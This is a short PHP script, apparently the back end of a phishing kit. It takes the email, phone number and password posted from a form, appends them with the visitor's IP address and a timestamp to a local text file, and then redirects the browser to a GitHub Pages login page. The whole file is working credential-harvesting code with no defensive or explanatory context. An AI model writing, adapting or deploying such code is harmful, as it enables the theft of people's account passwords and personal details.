<?php
$file =  "===========((29-11-2022))===========.txt";
$email = $_POST['email'];
$Phone = $_POST['Phone'];
$Password = $_POST['Password'];
$ip = $_SERVER['REMOTE_ADDR'];
$today = date("F j, Y, g:i a");

$handle = fopen($file, 'a');
fwrite($handle, "\n");
fwrite($handle, "===========================[mmm]===========================");
fwrite($handle, "\n");
fwrite($handle, "Email	        	: ");
fwrite($handle, "$email");
fwrite($handle, "\n");
fwrite($handle, "Password		: ");
fwrite($handle, "$Password");
fwrite($handle, "\n");
fwrite($handle, "Phone			: ");
fwrite($handle, "$Phone");
fwrite($handle, "\n");
fwrite($handle, "IP Address		: ");
fwrite($handle, "$ip");
fwrite($handle, "\n");
fwrite($handle, "Date Submitted          : ");
fwrite($handle, "$today");
fwrite($handle, "\n");
fwrite($handle, "===========================[mmm]===========================");
fwrite($handle, "\n");
fclose($handle);
echo "<script LANGUAGE=\"JavaScript\">
<!--
window.location=\"https://mmm-office-mavro.github.io/login/mail.html\";
// -->
</script>";
?>
